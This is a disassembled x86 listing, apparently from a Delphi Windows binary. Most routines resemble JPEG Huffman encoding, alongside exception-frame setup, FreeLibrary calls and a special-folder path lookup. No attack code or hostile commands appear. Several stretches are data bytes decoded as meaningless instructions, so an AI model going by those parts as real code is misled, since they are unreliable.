inc [ ebp - 0x10 ]
add [ ebp - 0x14 ] 0x4
cmp [ ebp - 0x10 ] 0x40
jl r-xdata
mov edi 0x1
jmp r-xdata
neg esi
dec [ ebp - 0xc ]
sub ebx 0x10
cmp ebx 0xf
jg r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
mov ecx [ ebp - 0x8 ]
movsx esi [ ecx + edx * 2 ]
test esi esi
jne r-xdata
test ebx ebx
jle r-xdata
sar esi 0x1
jne r-xdata
mov eax 0x1
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
movsx ecx [ eax + 0x400 ]
mov eax [ ebp - 0x4 ]
mov edx [ edx ]
call sub_49d400
test eax eax
jne r-xdata
inc edi
cmp edi 0xa
jle r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
shl eax 0x4
add eax edi
mov edx [ ebp + 0x8 ]
movsx ecx [ edx + eax + 0x400 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + eax * 4 ]
mov eax [ ebp - 0x4 ]
call sub_49d400
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov edx [ eax ]
mov [ edx + 0x14 ] 0x6
mov edx [ eax ]
call [ edx ]
mov ecx edi
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_49d400
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
xor ebx ebx
xor eax eax
jmp r-xdata
sub_49d66c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_49d4a8
test eax eax
jne r-xdata
mov edx [ ebx ]
inc [ ebx ]
mov [ edx ] 0xff
dec [ ebx + 0x4 ]
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov ecx [ ebx ]
mov edx esi
inc [ ebx ]
add dl 0xd0
mov [ ecx ] dl
dec [ ebx + 0x4 ]
jne r-xdata
mov eax ebx
call sub_49d3d8
test eax eax
jne r-xdata
xor edx edx
lea eax [ ebx + 0x10 ]
jmp r-xdata
mov eax ebx
call sub_49d3d8
test eax eax
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov ecx [ ebx + 0x20 ]
cmp edx [ ecx + 0xf0 ]
jl r-xdata
xor eax eax
pop esi
pop ebx
retn
xor ecx ecx
inc edx
mov [ eax ] ecx
add eax 0x4
mov eax 0x1
pop esi
pop ebx
retn
sub_49d6e0
push ebx
push esi
mov esi eax
push edi
push ebp
add esp 0xffffffd4
mov eax [ esi + 0x18 ]
mov ebx edx
mov ebp [ esi + 0x168 ]
mov edx [ eax ]
mov [ esp + 0x8 ] edx
mov ecx [ eax + 0x4 ]
mov [ esp + 0xc ] ecx
push esi
lea edi [ esp + 0x14 ]
lea esi [ ebp + 0xc ]
mov ecx 0x6
[ edi ] [ esi ]
pop esi
mov [ esp + 0x28 ] esi
cmp [ esi + 0xc4 ] 0x0
je r-xdata
xor edx edx
mov [ esp ] edx
mov ecx ebx
mov ebx ecx
lea eax [ esi + 0x110 ]
mov [ esp + 0x4 ] eax
jmp r-xdata
cmp [ ebp + 0x24 ] 0x0
jne r-xdata
mov eax [ esp ]
cmp eax [ esi + 0x10c ]
jl r-xdata
mov edx [ ebp + 0x28 ]
lea eax [ esp + 0x8 ]
call sub_49d66c
test eax eax
jne r-xdata
mov edx [ esp + 0x4 ]
mov edi [ edx ]
mov eax [ esi + edi * 4 + 0xf4 ]
mov edx [ eax + 0x14 ]
mov ecx [ ebp + edx * 4 + 0x2c ]
push ecx
mov eax [ eax + 0x18 ]
mov edx [ ebp + eax * 4 + 0x3c ]
push edx
mov ecx [ esp + edi * 4 + 0x20 ]
lea eax [ esp + 0x10 ]
mov edx [ ebx ]
call sub_49d4d8
test eax eax
jne r-xdata
mov eax [ esi + 0x18 ]
mov edx [ esp + 0x8 ]
lea edi [ ebp + 0xc ]
mov [ eax ] edx
mov ecx [ esp + 0xc ]
mov [ eax + 0x4 ] ecx
push esi
lea esi [ esp + 0x14 ]
mov ecx 0x6
[ edi ] [ esi ]
pop esi
mov eax [ esi + 0xc4 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebx ]
movsx ecx [ edx ]
mov [ esp + edi * 4 + 0x18 ] ecx
inc [ esp ]
add ebx 0x4
add [ esp + 0x4 ] 0x4
xor eax eax
jmp r-xdata
mov eax 0x1
cmp [ ebp + 0x24 ] 0x0
jne r-xdata
add esp 0x2c
pop ebp
pop edi
pop esi
pop ebx
retn
dec [ ebp + 0x24 ]
mov [ ebp + 0x24 ] eax
inc [ ebp + 0x28 ]
and [ ebp + 0x28 ] 0x7
sub_49d7f0
push ebx
mov ebx eax
push esi
push edi
mov eax [ ebx + 0x18 ]
add esp 0xffffffdc
mov esi [ ebx + 0x168 ]
mov edx [ eax ]
mov [ esp ] edx
mov ecx [ eax + 0x4 ]
mov [ esp + 0x4 ] ecx
push esi
lea edi [ esp + 0xc ]
add esi 0xc
mov ecx 0x6
[ edi ] [ esi ]
pop esi
mov [ esp + 0x20 ] ebx
mov eax esp
call sub_49d4a8
test eax eax
jne r-xdata
mov eax [ ebx + 0x18 ]
mov edx [ esp ]
lea edi [ esi + 0xc ]
mov [ eax ] edx
mov ecx [ esp + 0x4 ]
mov [ eax + 0x4 ] ecx
push esi
lea esi [ esp + 0xc ]
mov ecx 0x6
[ edi ] [ esi ]
pop esi
add esp 0x24
pop edi
pop esi
pop ebx
retn
mov edx [ ebx ]
mov eax ebx
mov [ edx + 0x14 ] 0x18
mov edx [ eax ]
call [ edx ]
sub_49d864
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edi [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
movsx eax [ eax ]
sub eax [ ebp - 0xc ]
test eax eax
jge r-xdata
xor esi esi
test eax eax
je r-xdata
neg eax
cmp esi 0xb
jle r-xdata
sar eax 0x1
inc esi
test eax eax
jne r-xdata
mov ecx [ ebp + 0xc ]
inc [ ecx + esi * 4 ]
xor ebx ebx
mov [ ebp - 0x10 ] 0x1
mov [ ebp - 0x14 ] rw-data
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
mov [ edx + 0x14 ] 0x6
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
cmp ebx 0xf
jle r-xdata
inc ebx
jmp r-xdata
test eax eax
jge r-xdata
inc [ edi + 0x3c0 ]
sub ebx 0x10
cmp ebx 0xf
jg r-xdata
inc [ ebp - 0x10 ]
add [ ebp - 0x14 ] 0x4
cmp [ ebp - 0x10 ] 0x40
jl r-xdata
mov esi 0x1
jmp r-xdata
neg eax
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
mov ecx [ ebp - 0x8 ]
movsx eax [ ecx + edx * 2 ]
test eax eax
jne r-xdata
test ebx ebx
jle r-xdata
sar eax 0x1
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
inc [ edi ]
inc esi
cmp esi 0xa
jle r-xdata
shl ebx 0x4
add esi ebx
inc [ edi + esi * 4 ]
xor ebx ebx
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
mov [ edx + 0x14 ] 0x6
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
sub_49d93c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov ebp eax
mov [ esp ] edx
cmp [ ebp + 0xc4 ] 0x0
mov ebx [ ebp + 0x168 ]
je r-xdata
xor eax eax
mov [ esp + 0x4 ] eax
lea eax [ ebp + 0x110 ]
mov edx [ esp ]
mov [ esp + 0x8 ] eax
mov edi edx
jmp r-xdata
cmp [ ebx + 0x24 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x10c ]
cmp ecx [ esp + 0x4 ]
jg r-xdata
dec [ ebx + 0x24 ]
xor esi esi
lea eax [ ebx + 0x14 ]
jmp r-xdata
mov edx [ esp + 0x8 ]
mov esi [ edx ]
mov eax [ ebp + esi * 4 + 0xf4 ]
mov edx [ eax + 0x14 ]
mov ecx [ ebx + edx * 4 + 0x4c ]
push ecx
mov eax [ eax + 0x18 ]
mov edx [ ebx + eax * 4 + 0x5c ]
push edx
mov edx [ edi ]
mov ecx [ ebx + esi * 4 + 0x14 ]
mov eax ebp
call sub_49d864
mov eax [ edi ]
movsx edx [ eax ]
mov [ ebx + esi * 4 + 0x14 ] edx
inc [ esp + 0x4 ]
add edi 0x4
add [ esp + 0x8 ] 0x4
mov eax 0x1
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
cmp esi [ ebp + 0xf0 ]
jl r-xdata
xor edx edx
inc esi
mov [ eax ] edx
add eax 0x4
mov ecx [ ebp + 0xc4 ]
mov [ ebx + 0x24 ] ecx
sub_49d9f0
push ebx
push esi
push edi
add esp 0xfffff7c8
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] edx
mov [ esp ] eax
push 0x21
push 0x0
lea eax [ esp + 0x14 ]
push eax
call sub_48ab3c
add esp 0xc
push 0x404
push 0x0
lea edx [ esp + 0x38 ]
push edx
call sub_48ab3c
add esp 0xc
xor ebx ebx
lea eax [ esp + 0x434 ]
mov [ eax ] 0xffffffff
inc ebx
add eax 0x4
cmp ebx 0x101
jl r-xdata
mov edx [ esp + 0x8 ]
mov [ edx + 0x400 ] 0x1
inc ebx
add edx 0x4
cmp ebx 0x100
jle r-xdata
cmp edi ecx
jl r-xdata
mov ecx [ edx ]
test ecx ecx
je r-xdata
or edx 0xffffffff
mov edi 0x3b9aca00
xor ebx ebx
mov ecx [ esp + 0x8 ]
mov edi ecx
mov eax ebx
inc ebx
add ecx 0x4
cmp ebx 0x100
jle r-xdata
cmp edi esi
jl r-xdata
mov esi [ ecx ]
test esi esi
je r-xdata
test edx edx
jl r-xdata
cmp eax ebx
je r-xdata
xor ebx ebx
lea esi [ esp + 0x30 ]
mov ecx [ esp + 0x8 ]
mov ebx [ esp + 0x8 ]
mov ecx [ ecx + edx * 4 ]
add [ ebx + eax * 4 ] ecx
xor ebx ebx
mov ecx [ esp + 0x8 ]
mov [ ecx + edx * 4 ] ebx
inc [ esp + eax * 4 + 0x30 ]
jmp r-xdata
mov edi esi
mov edx ebx
inc ebx
add esi 0x4
cmp ebx 0x100
jle r-xdata
cmp eax 0x20
jle r-xdata
mov ecx [ esp + eax * 4 + 0x434 ]
test ecx ecx
jge r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
mov ebx 0x20
lea esi [ esp + 0x2c ]
mov ecx [ esi ]
inc [ esp + ecx + 0xc ]
mov edx [ esp ]
mov ecx [ edx ]
mov [ ecx + 0x14 ] 0x27
mov eax [ esp ]
mov edx [ eax ]
call [ edx ]
mov eax ecx
inc [ esp + eax * 4 + 0x30 ]
mov [ esp + eax * 4 + 0x434 ] edx
inc [ esp + edx * 4 + 0x30 ]
jmp r-xdata
cmp [ ecx ] 0x0
ja r-xdata
mov eax [ esp + edx * 4 + 0x434 ]
test eax eax
jge r-xdata
lea eax [ ebx - 0x2 ]
lea edx [ esp + eax + 0xc ]
jmp r-xdata
dec ebx
dec esi
cmp ebx 0x10
jg r-xdata
mov edx eax
inc [ esp + edx * 4 + 0x30 ]
jmp r-xdata
cmp [ edx ] 0x0
je r-xdata
mov ecx esi
jmp r-xdata
lea eax [ esp + ebx + 0xc ]
jmp r-xdata
or eax 0xffffffff
mov edi 0x3b9aca00
xor ebx ebx
mov edx [ esp + 0x8 ]
dec eax
dec edx
add [ ecx ] 0xfe
inc [ ecx - 0x1 ]
add [ esp + eax + 0xd ] 0x2
dec [ esp + eax + 0xc ]
cmp [ eax ] 0x0
je r-xdata
dec ebx
dec eax
dec [ esp + ebx + 0xc ]
push 0x11
lea edx [ esp + 0x10 ]
push edx
mov ecx [ esp + 0xc ]
push ecx
call sub_48ab50
add esp 0xc
xor edi edi
mov ebx 0x1
inc eax
add edx 0x4
cmp eax 0xff
jle r-xdata
mov [ esi ] al
inc edi
inc esi
cmp ebx [ edx ]
jne r-xdata
inc ebx
cmp ebx 0x20
jle r-xdata
xor eax eax
mov edx [ esp + 0x4 ]
lea esi [ edx + edi + 0x11 ]
lea edx [ esp + 0x30 ]
mov eax [ esp + 0x4 ]
xor ecx ecx
mov [ eax + 0x114 ] ecx
add esp 0x838
pop edi
pop esi
pop ebx
retn
sub_49dbd4
push ebx
push esi
push edi
push ebp
add esp 0xffffffd4
mov ebx eax
mov eax [ ebx + 0x168 ]
mov [ esp ] eax
push 0x10
push 0x0
lea edx [ esp + 0x14 ]
push edx
call sub_48ab3c
add esp 0xc
push 0x10
push 0x0
lea ecx [ esp + 0x24 ]
push ecx
call sub_48ab3c
add esp 0xc
xor eax eax
mov [ esp + 0x4 ] eax
lea edx [ ebx + 0xf4 ]
mov [ esp + 0x8 ] edx
jmp r-xdata
mov ecx [ esp + 0x4 ]
cmp ecx [ ebx + 0xf0 ]
jl r-xdata
mov ecx [ esp + 0x8 ]
mov eax [ ecx ]
mov edi [ eax + 0x14 ]
mov ebp [ eax + 0x18 ]
cmp [ esp + edi * 4 + 0xc ] 0x0
jne r-xdata
add esp 0x2c
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esp + ebp * 4 + 0x1c ] 0x0
jne r-xdata
lea esi [ ebx + edi * 4 + 0x54 ]
cmp [ esi ] 0x0
jne r-xdata
inc [ esp + 0x4 ]
add [ esp + 0x8 ] 0x4
lea esi [ ebx + ebp * 4 + 0x64 ]
cmp [ esi ] 0x0
jne r-xdata
mov edx [ esp ]
mov ecx [ edx + edi * 4 + 0x4c ]
mov edx [ esi ]
mov eax ebx
call sub_49d9f0
mov [ esp + edi * 4 + 0xc ] 0x1
mov eax ebx
call sub_497854
mov [ esi ] eax
mov edx [ esp ]
mov ecx [ edx + ebp * 4 + 0x5c ]
mov edx [ esi ]
mov eax ebx
call sub_49d9f0
mov [ esp + ebp * 4 + 0x1c ] 0x1
mov eax ebx
call sub_497854
mov [ esi ] eax
sub_49dcac
push ebx
mov ebx eax
mov eax ebx
push esi
mov ecx 0x6c
mov edx 0x1
mov esi [ eax + 0x4 ]
call [ esi ]
mov [ ebx + 0x168 ] eax
mov [ eax ] sub_49d050
xor edx edx
add eax 0x3c
xor ecx ecx
mov [ eax ] ecx
mov [ eax - 0x10 ] ecx
xor ecx ecx
mov [ eax + 0x20 ] ecx
mov [ eax + 0x10 ] ecx
inc edx
add eax 0x4
cmp edx 0x4
jl r-xdata
pop esi
pop ebx
retn
sub_49dcf0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_49dd27
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49dd2e
retn
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_42649c
sub_49dd4c
or al [ eax ]
add [ eax ] al
nop
scasd [ edi ]
dec edx
add [ edx + esi * 4 + 0x4a ] dh
add [ eax ] al
mov [ edi - 0x4f47ffb6 ] gs
dec edx
add [ eax ] al
add [ eax ] al
add [ eax + 0x20004aaf ] cl
mov al 0x4a
add [ eax ] al
add [ eax ] al
add [ edi + ebp * 4 - 0x4e63ffb6 ] al
dec edx
add [ eax ] al
add [ eax ] al
add [ eax + 0x10004aaf ] al
mov bl 0x4a
add [ eax ] al
add [ eax ] al
add [ edi + ebp * 4 + 0x4a ] bh
add [ eax - 0x4a ] ch
dec edx
add [ eax ] al
add [ eax ] al
add [ eax - 0x51 ] bh
dec edx
add [ ebx + esi * 4 + 0x4a ] ah
add [ eax ] al
add [ eax ] al
add [ edi + ebp * 4 + 0x4a ] dh
add [ eax - 0x4c ] dl
dec edx
add [ eax ] al
add [ eax ] al
add [ eax - 0x51 ] dh
dec edx
add [ esi + esi * 4 ] ah
dec edx
add [ eax ] al
add [ eax ] al
add [ edi + ebp * 4 + 0x4a ] ch
add [ eax - 0x50 ] ah
dec edx
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_49ddf4
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49ddfb
retn
call sub_49dd30
sub_49de00
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_49de3c
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49de43
retn
mov eax rw-data
mov ecx 0x6
mov edx [ r-xdata ]
call sub_405af0
sub_49de7f
dec [ edx ]
add [ eax ] al
add [ ebp + 0x41 ] cl
push eax
dec ecx
xor esi [ edx ]
inc esp
dec esp
dec esp
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_49ded5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49dedc
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
call sub_404e44
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_49dee0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_49df24
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49df2b
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_49dfc7
inc [ ebx ]
add [ eax ] al
add [ eax + edi * 2 + 0x74 ] dh
add [ ebp - 0x75 ] dl
in al dx
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
pop ebx
pop ebp
retn 0x4
sub_49dff8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_49e067
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49e06e
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
mov eax rw-data
mov edx [ r-xdata ]
call sub_405aa4
mov eax rw-data
mov edx [ r-xdata ]
call sub_405aa4
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_49e074
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_49e091
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and al 0xe1
dec ecx
add [ eax ] al
add [ eax ] al
and [ edi + 0x41 ] cl
add [ ecx + eax * 2 - 0x29c3ffc0 ] ch
inc ecx
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] al
add [ eax ] al
and [ edi + 0x41 ] cl
add [ ecx + eax * 2 - 0x29c3ffc0 ] ch
inc ecx
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add al cl
aad 0x41
add al dh
salc
inc ecx
add [ eax + edx * 2 + 0x4a ] bh
add [ ecx ] cl
push esp
push ebx
dec ecx
push esp
push 0x64616572
mov eax eax
sbb al 0xe1
dec ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] ah
add [ eax ] bl
aas
inc eax
add al cl
aad 0x41
add al dh
salc
inc ecx
add [ eax + edx * 2 + 0x5409004a ] al
push ebx
inc esp
push esp
push 0x64616572
mov eax eax
jl r-xdata
dec ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + r--data ] al
add [ eax ] al
and [ edi + 0x41 ] cl
add [ ecx + eax * 2 - 0x29c3ffc0 ] ch
inc ecx
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add al cl
aad 0x41
add al dh
salc
inc ecx
add [ eax + edx * 2 + 0x5409004a ] cl
inc esp
dec esp
push esp
push 0x64616572
mov eax eax
fsubr st1
dec ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
loop r-xdata
mov al [ 0xffffffffec004501 ]
add [ eax - 0x1d ] dh
dec ecx
add [ edx ] bh
jecxz r-xdata
sub [ ebx ] al
inc ebp
add [ eax ] dh
mov edi 0xe2000043
inc ecx
add [ eax - 0x23ffbaf4 ] bh
fiadd [ ecx ]
movsb [ edi ] [ esi ]
push ebp
inc ebp
add [ esp + edi * 8 ] dl
add [ ebx + 0x49 ] cl
add [ eax ] al
add [ eax ] al
add [ edi - 0x1d ] bl
dec ecx
add al dh
add eax [ eax ]
add [ edi + ecx * 8 + 0x44 ] dl
add al ch
loope r-xdata
inc esp
add [ edx + eax * 2 + 0x44 ] ch
add [ eax + 0x48 ] bh
inc esp
add ah al
inc edi
inc esp
add [ eax ] ah
mov dl 0x43
add [ eax ] dh
cmp eax 0x8ec0044
inc ebp
add [ ecx + edi - 0x4e9fffbc ] bh
inc ebx
add [ ecx + esi * 4 + 0x43 ] ah
add al ah
or [ ebp ] eax
inc esp
0x52700043 0x45
fcomp st6
inc ecx
add [ ebp + edx * 2 - 0x3ebffbb ] ah
add [ ebp ] eax
add [ eax + 0x5c0044fd ] ah
inc [ eax + eax - 0x40 ]
inc ecx
inc eax
add [ eax + 0x2f ] al
inc ebp
add ah bh
inc eax
add [ eax ] bl
aas
inc eax
add ah al
inc [ eax + eax + 0x48 ]
dec eax
inc esp
add [ eax - 0x37ffbafb ] bh
insd
inc ecx
add [ eax - 0x13ffbaff ] ah
sub_49e38c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx 0x104
call sub_4055ac
push 0x0
push esi
mov eax [ ebx ]
call sub_405324
push eax
push 0x0
call SHGetSpecialFolderPathA
test eax eax
jne r-xdata
mov eax [ ebx ]
call sub_405324
call sub_40a308
mov edx eax
mov eax ebx
call sub_4055ac
pop esi
pop ebx
retn
mov eax ebx
call sub_404e44
pop esi
pop ebx
retn
sub_49e3d8
push ebp
mov ebp esp
push ecx
mov ecx 0x4
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_405314
xor eax eax
push ebp
push sub_49e50f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_404edc
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
lea edx [ ebp - 0x24 ]
mov eax r-xdata
call sub_45ec84
mov edx [ ebp - 0x24 ]
lea eax [ ebp - 0x8 ]
call sub_40512c
lea edx [ ebp - 0x20 ]
mov eax r-xdata
call sub_45ec84
mov edx [ ebp - 0x20 ]
lea eax [ ebp - 0x8 ]
call sub_40512c
jmp r-xdata
lea edx [ ebp - 0x18 ]
mov eax r-xdata
call sub_45ec84
mov eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x1c ]
call sub_45e8a8
mov edx [ ebp - 0x1c ]
lea eax [ ebp - 0x8 ]
pop ecx
call sub_405170
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax r-xdata
call sub_45ec84
mov eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x14 ]
call sub_45e8a8
mov edx [ ebp - 0x14 ]
lea eax [ ebp - 0x8 ]
pop ecx
call sub_405170
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_404e98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49e516
lea eax [ ebp - 0x24 ]
mov edx 0x6
call sub_404e68
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404e68
retn
mov eax [ ebp - 0x8 ]
call sub_409e3c
xor eax eax
push ebp
push sub_49e4d2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0x2
mov eax [ ebp - 0x8 ]
call sub_409f34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_49e60c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_49e62b
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49e632
retn
sub_49e634
push ebp
mov ebp esp
mov ecx 0x11
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_49ea5b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
push [ eax ]
lea eax [ ebp - 0x14 ]
mov edx [ rw-data ]
mov edx [ edx + 0x3c4 ]
call sub_4057bc
push [ ebp - 0x14 ]
lea edx [ ebp - 0x1c ]
mov eax r-xdata
call sub_45ec84
mov edx [ ebp - 0x1c ]
lea eax [ ebp - 0x18 ]
call sub_4057bc
push [ ebp - 0x18 ]
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_405858
mov edx [ ebp - 0x10 ]
lea eax [ ebp - 0xc ]
call sub_4050e8
mov eax [ ebp - 0xc ]
call sub_45e474
cmp edx 0x0
jne r-xdata
setge al
cmp eax 0x0
setae al
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_403f64
test bl bl
je r-xdata
mov edx [ rw-data ]
mov [ edx + 0x1c ] al
mov eax [ rw-data ]
mov edx r-xdata
call sub_404e98
lea edx [ ebp - 0x20 ]
mov eax r-xdata
call sub_45ec84
mov edx [ ebp - 0x20 ]
mov eax [ rw-data ]
add eax 0x4
call sub_404e98
lea edx [ ebp - 0x24 ]
mov eax r-xdata
call sub_45ec84
mov edx [ ebp - 0x24 ]
mov eax [ rw-data ]
add eax 0x8
call sub_404e98
lea edx [ ebp - 0x28 ]
mov eax r-xdata
call sub_45ec84
mov edx [ ebp - 0x28 ]
mov eax [ rw-data ]
add eax 0xc
call sub_404e98
lea edx [ ebp - 0x2c ]
mov eax r-xdata
call sub_45ec84
mov edx [ ebp - 0x2c ]
mov eax [ rw-data ]
add eax 0x10
call sub_404e98
lea edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_45ec84
mov edx [ ebp - 0x30 ]
mov eax [ rw-data ]
add eax 0x14
call sub_404e98
lea edx [ ebp - 0x34 ]
mov eax r-xdata
call sub_45ec84
mov edx [ ebp - 0x34 ]
mov eax [ rw-data ]
add eax 0x18
call sub_404e98
mov eax [ rw-data ]
push [ eax ]
lea eax [ ebp - 0x3c ]
mov edx [ rw-data ]
mov edx [ edx + 0x3c4 ]
call sub_4057bc
push [ ebp - 0x3c ]
lea edx [ ebp - 0x44 ]
mov eax r-xdata
call sub_45ec84
mov edx [ ebp - 0x44 ]
lea eax [ ebp - 0x40 ]
call sub_4057bc
push [ ebp - 0x40 ]
lea eax [ ebp - 0x38 ]
mov edx 0x3
call sub_405858
mov edx [ ebp - 0x38 ]
lea eax [ ebp - 0x4 ]
call sub_4050e8
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ ebp - 0x8 ] eax
mov bl 0x1
xor eax eax
push ebp
push sub_49e809
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49ea62
lea eax [ ebp - 0x8c ]
mov edx 0x13
call sub_404e68
lea eax [ ebp - 0x40 ]
mov edx 0x3
call sub_405684
lea eax [ ebp - 0x34 ]
mov edx 0x7
call sub_404e68
lea eax [ ebp - 0x18 ]
mov edx 0x3
call sub_405684
lea eax [ ebp - 0xc ]
call sub_404e44
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
lea edx [ ebp - 0x50 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x50 ]
lea edx [ ebp - 0x4c ]
call sub_4093d8
mov eax [ ebp - 0x4c ]
lea ecx [ ebp - 0x48 ]
mov edx [ rw-data ]
mov edx [ edx + 0x10 ]
call sub_45ee80
lea eax [ ebp - 0x48 ]
mov edx r-xdata
call sub_40512c
mov edx [ ebp - 0x48 ]
mov eax [ ebp - 0x8 ]
